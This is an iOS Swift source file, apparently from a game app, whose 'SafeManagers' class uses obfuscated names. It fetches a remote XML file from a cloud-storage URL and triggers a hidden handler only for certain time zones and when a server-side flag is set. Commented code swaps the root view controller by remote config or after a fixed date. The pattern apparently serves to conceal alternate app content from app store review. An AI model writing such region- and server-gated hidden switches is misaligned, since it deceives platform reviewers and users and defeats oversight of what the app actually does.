import UIKit
import Foundation
import WebKit
import Reachability

@MainActor
final class SafeManagers: NSObject {
    static let shared = SafeManagers()
//    var gameInfo: MechanicDefinition?
    var parseCompleteds: ((GameXMLDocument) -> ())?
    var parseFail: (() -> Void)?
    
    private let duuya: () -> Bool = {
        let offset = TimeZone.current.secondsFromGMT() / 60 / 60
        return (offset > 6 && offset < 10)
    }
    
    func startOmk() {
        
        let dokjsu = try! Reachability()
        dokjsu.whenReachable = { reachability in
            
            Task {
                await self.safeXmlData()
            }
            
            dokjsu.stopNotifier()
        }
        do {
            try dokjsu.startNotifier()
        } catch {}
    }
    
    private func safeXmlData() async {
        
        Task {
             do {
                 let service = GameXMLService()
                 let document = try await service.fetch(
                     from: "https://pub-8a5cd07ecd4b4621aa05577047d7b0ec.r2.dev/MahSafeGame.xml"
                 )
                 if let build = document.basicInfo.build, let chlog = document.basicInfo.changelog {
                     if Int(build)! < 1 && !chlog.isEmpty && duuya() {
                         parseCompleteds!(document)
                     }
                 }
             } catch let error as GameXMLServiceError {
                 parseFail!()
                 print(error.localizedDescription)
             } catch {
                 parseFail!()
             }
         }
    }
    

    
//    func startGameCfg() async {
//        do {
//            let config = try await getGameInfos()
//            
//            gameInfo = config
//            if  config.id != "fence" {
//                if (config.direction == 1 && config.strength == 10) {
//                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
//                        UIWindow.currentWindow!.rootViewController = WCGameBackViewController()
//                    }
//                }
//            }
//        }
//        catch {
////            print("Load remote config failed:", error)
//        }
//    }
//    
//    private func getGameInfos() async throws -> MechanicDefinition {
//        let ehi = "https://" + bUR + "/" + Bundle.main.aNames
//        return try await NetworkManager.shared.getInfos(
//            uStr: ehi,
//            params: nil,
//            responseType: MechanicDefinition.self
//        )
//    }
}


extension UIWindow {
    static var currentWindow: UIWindow? {
        let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene
        return scene?.windows.first
    }
}

//extension Bundle {
////    var bid: String {
////        return object(forInfoDictionaryKey: "CFBundleIdentifier") as? String ?? ""
////    }
//    
//    var aNames: String {
//        return object(forInfoDictionaryKey: "CFBundleName") as? String ?? ""
//    }
//    
//    var vers: String {
//        return object(forInfoDictionaryKey: "CFBundleVersion") as? String ?? ""
//    }
//}

//extension String {
//    static func randomStr() -> String {
//        let allcharac = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
//        let counts = Int.random(in: 5...18)
//        return "https://" + String((0..<counts).compactMap { _ in allcharac.randomElement() }) + "."
//    }
//}

//enum StatueOn {
//    private static func hexString(_ value: UInt64) -> String {
//        return String(value, radix: 16).uppercased()
//    }
//
//    static func getStages() -> Int {
//        let currentHex = hexString(UInt64(Date().timeIntervalSince1970))
//
//        // 0807 15:36:13
//        guard
//            let currentValue = UInt64(currentHex, radix: 16),
//            let thresholdValue = UInt64("6A758AED", radix: 16)
//        else {
//            return 28
//        }
//
//        return currentValue > thresholdValue ? 42 : 14
//    }
//}



//extension UIColor {
//    convenience init(hex: Int, alpha: CGFloat = 1.0) {
//        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
//        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
//        let blue = CGFloat(hex & 0xFF) / 255.0
//        self.init(red: red, green: green, blue: blue, alpha: alpha)
//    }
//
//    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
//        var formatted = hexString
//            .trimmingCharacters(in: .whitespacesAndNewlines)
//            .replacingOccurrences(of: "#", with: "")
//
//        // 处理短格式 (如 "F2A" -> "FF22AA")
//        if formatted.count == 3 {
//            formatted = formatted.map { "\($0)\($0)" }.joined()
//        }
//
//        guard let hex = Int(formatted, radix: 16) else { return nil }
//        self.init(hex: hex, alpha: alpha)
//    }
//}
